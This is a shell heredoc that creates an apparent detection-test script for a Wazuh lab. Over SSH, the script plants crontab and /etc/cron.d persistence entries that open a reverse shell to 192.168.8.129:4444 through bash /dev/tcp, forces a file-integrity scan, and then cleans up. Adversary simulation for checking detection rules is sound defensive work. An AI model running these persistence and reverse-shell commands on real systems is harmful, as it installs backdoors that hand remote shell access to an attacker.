cat > persistence_cron.sh << 'EOF'
#!/bin/bash
TARGET_IP="${1:-192.168.8.130}"
TARGET_USER="${2:-linux-endpoint-1}"
SSH_KEY="${3:-$HOME/.ssh/ansible_wazuh_key}"

echo "[+] Persistence via Crontab on $TARGET_IP"
echo "[+] MITRE T1053.003 | Expected: Rule 100003 (Level 7)"

ssh -i "$SSH_KEY" -o StrictHostKeyChecking=no "$TARGET_USER@$TARGET_IP" '
    # Add a real cron job (this modifies /var/spool/cron/crontabs/$USER)
    echo "[*] Injecting malicious cron job..."
    (crontab -l 2>/dev/null; echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.168.8.129/4444 0>&1'") | crontab -
    
    echo "[*] Current crontab:"
    crontab -l
    
    # Also touch system cron files to trigger FIM
    echo "[*] Touching /etc/crontab and /etc/cron.d/..."
    sudo touch /etc/crontab 2>/dev/null || true
    sudo touch /etc/cron.d/backdoor 2>/dev/null || true
    echo "* * * * * root /bin/bash -i >& /dev/tcp/192.168.8.129/4444 0>&1" | sudo tee /etc/cron.d/backdoor > /dev/null 2>&1 || true
    
    # Force FIM scan
    sudo /var/ossec/bin/wazuh-control restart 2>/dev/null || true
    
    sleep 3
    
    echo "[*] Cleaning up cron entries..."
    crontab -l 2>/dev/null | grep -v "bash -i" | crontab -
    sudo rm -f /etc/cron.d/backdoor 2>/dev/null || true
    echo "[*] Cleanup done."
'

echo "[+] Done. Check Wazuh: rule.id:100003"
echo "[!] NOTE: FIM must monitor /var/spool/cron and /etc/crontab for this rule to fire."
EOF
chmod +x persistence_cron.sh